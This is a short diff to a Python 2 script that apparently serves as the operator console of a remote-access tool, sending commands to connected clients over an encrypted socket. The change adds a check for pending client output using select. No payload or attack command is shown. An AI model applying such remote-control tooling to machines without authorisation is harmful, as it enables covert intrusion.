@@ -7,6 +7,7 @@
 
 import argparse
 import readline
+import select
 import socket
 import sys
 import threading
@@ -110,6 +111,11 @@ class ClientConnection():
             print 'Error: Client not connected.'
             return
 
+        # check for old output
+        readable, _, _ = select.select([self.conn], [], [], 0)
+        if readable:
+            print self.old_output(0)
+
         # seperate prompt into command and action
         cmd, _, action = prompt.partition(' ')
 
@@ -143,6 +149,14 @@ class ClientConnection():
             print 'Running {}...'.format(cmd)
             recv_data = decrypt(self.conn.recv(4096), self.dhkey)
             print recv_data
+
+    def old_output(self, timeout=10):
+        readable, _, exceptional = select.select([self.conn], [], [self.conn], timeout)
+        if self.conn in exceptional:
+            print 'Error: Socket error.'
+        elif self.conn in readable:
+            recv_data = decrypt(self.conn.recv(4096), self.dhkey)
+            return recv_data
 
 
 def completer(text, state):
